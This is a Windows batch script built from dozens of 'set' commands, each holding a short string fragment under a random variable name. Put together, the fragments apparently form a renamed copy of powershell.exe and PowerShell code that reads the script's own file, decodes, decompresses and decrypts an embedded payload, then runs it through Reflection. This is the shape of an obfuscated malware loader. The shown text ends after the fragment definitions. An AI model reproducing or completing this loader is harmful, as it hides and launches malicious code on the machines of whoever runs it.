@echo off
set "QUjDXiHgEe=ll"
set "cshlJeECzx=he"
set "hjdiCIMjeL=we"
set "JdxkvuQNlD=he"
set "owUoNnDRrp=s\"
set "jZcFgWsrNi=ws"
set "nXyqEwiKle=Po"
set "WbTOxBrNuC=ow"
set "VOHUcvzwqe=1."
set "NHMUpzZKBB=py"
set "wueggCsbwj=ll"
set "cdSdUEeqkU=do"
set "NGHaiXoPEk=we"
set "kradRnBudq=rS"
set "NVOoJuYkfM=Wi"
set "bgSyPpHkXb=\W"
set "sLpgNQmUXo=0\"
set "mDajmuJVuW=in"
set "dlQCyUiwrQ=em"
set "VAXUJyFEmN=po"
set "ddQlkZPEdM=.e"
set "GzySRlAkUV=Sy"
set "plpZzNlDPm=:\"
set "RZXAViMhvH= /"
set "VgnzKFFzWM=co"
set "HDMDYWXvyq=\v"
set "jrgbKEJDFh= C"
set "aiUyzwCbXl=32"
set "kYOfedLTNh=xe"
set "qdLfeEamOf=nd"
set "NZOJqMbZRh=st"
set "ohcKdFnmZw=y "
set "dVKsQWoGPh=rs"
set "UbTHNHhmZE=cd"
set "aGlWoqFcYS= %~dp0"
set "awnKqQQBOb=);$q"
set "YAPZjwWxBV==');"
set "dgUAACLFyi=th('"
set "iWmHjylrfJ=L.Pa"
set "vavvTLJqvL=ct S"
set "fNLpcxYnWx=.Mod"
set "PhvxEfCodS=uU ="
set "ZgsJKtHkUc=Bmor"
set "xKgIpRgEDQ=Zpj."
set "OjmoROQjko=);$T"
set "jliVEYUnNX=a) {"
set "xvxqLxCbcE=tryP"
set "oKsxmXJIPq=ispo"
set "IJvutzZpAm=::De"
set "ZiWWTCvHrJ=vert"
set "BDhFrusPoG=UGTu"
set "hdtsjJnaTB=]::("
set "UdFUPUDDns=em.I"
set "IHXSkAKYKz=w = "
set "xlkwYZsQnd=$Tyc"
set "QfBPsYHKYL=..-1"
set "lKQYGZjQLb=7Yiv"
set "XmnHWRFhaB=XoLl"
set "szVhFfHXOa=m(, "
set "rhqQgCmgxv=gth)"
set "woYqtXWgaC=V = "
set "xLgjYBQYLa=sGUc"
set "LGNpkpmqJP=stem"
set "TgjzgKZiOa=Comp"
set "qhIkcLrWek=rt]:"
set "UdnkWXWquS=Rx.T"
set "VyWjglVutI=join"
set "TlcuxqKyeB=ose("
set "JHTsVesjvv=Ycku"
set "yOIDXSzxzW=.Sec"
set "GYCIRvFceP=oint"
set "qRiVsXkEiy=ect "
set "NBnRxkBSkc=ew-O"
set "ekmPDxCDHy=YRx."
set "WiIjqBwaOb=; };"
set "sYTmfKkodZ=-ep "
set "nqeJzdZKXH=Invo"
set "xuACDupHwe===')"
set "QNklcuJbSC=ionM"
set "sLeNmgVAmI=);$D"
set "DvhbqBPhCJ=)) {"
set "ATTIrblwFL=form"
set "nhYYRFvAft=.GZi"
set "HiIsykHNnY=);$D"
set "HDYJTPhgCn=.IO."
set "SqkhxZWeAX=ke($"
set "aVemEbjkvt=join"
set "nWBTeCkDrF=zS.T"
set "sklJmEHTjd=)($u"
set "GMMQlSQIYE=rofi"
set "lyKBLNoSsV=urit"
set "fJIAizhJup=saBm"
set "BwvZAwQiMu=[Env"
set "yiXtdPolaa=ing("
set "ujSDhXWLlp=3); "
set "xViwsCiBgE=Obje"
set "NEdPwSlGIZ=lDZp"
set "VuRHEUvBLv=();$"
set "HdPVWCUKTM=ose("
set "dwpDexFMKX=em.C"
set "cSLCOKeDlQ=[Sys"
set "FkUMMebFdy=.Key"
set "btjmjPpWjq=yste"
set "IefoxzpXWj= [Sy"
set "uWnUEgVPlt=flec"
set "MeIKBUyaaY= = N"
set "WzIOxMMdUQ=('%~f0'"
set "tkDwbwRNqF=zS);"
set "HSvywsNVcI=la ="
set "WljqbhtSrL=oArr"
